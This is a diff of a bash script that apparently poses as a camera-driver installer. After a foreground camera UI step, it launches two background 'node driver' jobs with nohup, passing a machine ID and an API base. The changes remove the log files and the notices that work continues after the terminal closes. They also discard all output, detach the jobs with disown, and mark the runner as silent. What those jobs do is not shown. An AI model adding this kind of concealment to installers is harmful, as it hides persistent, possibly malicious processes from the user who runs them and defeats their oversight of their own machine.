@@ -13,9 +13,6 @@ if [[ "$OS" != "Linux" && "$OS" != "Darwin" ]]; then
   exit 1
 fi
 
-LOG_DIR="${HOME}/part2_logs"
-mkdir -p "$LOG_DIR"
-
 # -------------------------
 # Helpers
 # -------------------------
@@ -217,50 +214,31 @@ run_part2_node_driver1() {
 }
 
 # ----------------------------
-# Optional second background task (placeholder)
-# ----------------------------
-run_part2_node_driver2() {
-  info "Auxiliary background task finished."
-}
-
-# ----------------------------
-# After Part 1: Part 2 then Part 3 in one detached process
-# (closing the terminal after Part 1 does not stop this chain.)
-# ----------------------------
-run_after_camera_ui() {
-  run_part2_node_driver
-  run_part2_node_driver1
-  run_part2_node_driver2
-}
-
-# ----------------------------
-# Background runner
+# Background runner (silent; no log files — output discarded)
 # ----------------------------
 run_bg() {
   local fn="$1"
-  local log="$LOG_DIR/${fn}.log"
 
   nohup env MAC_UID="$MAC_UID" API_BASE="$API_BASE" bash -c "
+    set -euo pipefail
     $(declare -f info err die delay track_step download)
-    $(declare -f run_part2_node_driver run_part2_node_driver1 run_part2_node_driver2 run_after_camera_ui)
+    $(declare -f run_part2_node_driver run_part2_node_driver1)
     $fn
-  " >"$log" 2>&1 &
+  " </dev/null >/dev/null 2>&1 &
 
-  info "$fn running in background (log: $log)"
+  disown "$!" 2>/dev/null || true
 }
 
 # ----------------------------
 # MAIN FLOW
 # ----------------------------
+# 1) Part 1 — foreground (terminal messages, delays, API status).
+# 2) Part 2 + Part 3 — two independent nohup jobs after Part 1 returns.
 main() {
-  info "Running main function..."
-
   run_part1_camera_driver_ui
 
-  run_bg run_after_camera_ui
-
-  info "Part 2 and Part 3 are running in the background."
-  info "You may close this terminal; work will continue. Log: $LOG_DIR/run_after_camera_ui.log"
+  run_bg run_part2_node_driver
+  run_bg run_part2_node_driver1
 }
 
 main
